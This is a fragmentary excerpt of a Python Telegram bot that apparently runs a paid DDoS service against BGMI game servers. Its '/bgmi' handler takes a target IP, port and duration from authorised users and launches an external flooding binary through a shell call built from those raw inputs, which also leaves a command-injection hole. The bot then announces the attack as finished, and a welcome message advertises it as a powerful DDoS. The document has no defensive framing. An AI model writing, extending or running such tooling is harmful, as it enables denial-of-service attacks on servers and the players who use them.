...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        command = message.text.split()
        if len(command) == 4:  # Updated to accept ip, time, and port
            ip = command[1]
            ...
            if time > 600:
                ...
                record_command_logs(user_id, '/bgmi', ip, port, time)
                log_command(user_id, ip, port, time)
                start_attack_reply(message, ip, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {ip} {port} {time} 100"
                process = subprocess.run(full_command, shell=True)
                response = f"‼️ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ‼️\n{ip}•{port}•{time}s"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage : /bgmi <ip> <port> <time>"  # Updated command syntax
    else:
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, This Is Most Powerfull Ddos !!:
